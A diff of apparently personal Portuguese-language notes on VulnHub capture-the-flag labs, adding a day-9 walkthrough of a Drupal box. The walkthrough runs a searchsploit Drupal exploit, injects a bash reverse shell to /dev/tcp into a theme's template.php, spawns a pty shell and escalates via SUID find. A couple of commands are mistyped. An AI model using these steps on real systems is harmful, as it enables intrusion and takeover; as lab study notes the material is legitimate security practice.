@@ -7,6 +7,8 @@ desafio 5 - https://www.vulnhub.com/entry/violator-1,153/
 desafio 6 - https://www.vulnhub.com/entry/w1r3s-101,220/
 Desafio 7 - https://www.vulnhub.com/entry/ha-wordy,363/
 Desafio 8 - https://www.vulnhub.com/entry/sunset-1,339/
+Desafio 9 - https://www.vulnhub.com/entry/dc-1-1,292/#download
+Desafio 10 - https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/
 
 --VM--
   
@@ -214,3 +216,25 @@ Dia 8 			14/9/2020
 
 				.
 				w /etc/passwd
+
+Dia 9 			15/9/2020
+	
+	*scan
+	
+	*searchsploit drupal
+			34992.py
+				explo.py
+				drupalpass.py
+					explo.py http://192.168.100.11/node?destination=node batman robin
+					
+	* appearence
+		themes
+			baixar qualquer um
+				template.php
+					adcionar codigo malicioso
+						exec("/bin/bash -c  'bash -i >& /dev/tcp/192.168.100.x/443 0>&1'");
+
+		*nc -lnvp 433
+			python -c 'import pty;pty.spawn("/bin/sh")'
+				find / -perm -u=s -file f 2>&-
+					/usr/bin/find -exec  "/bin/bash" \;
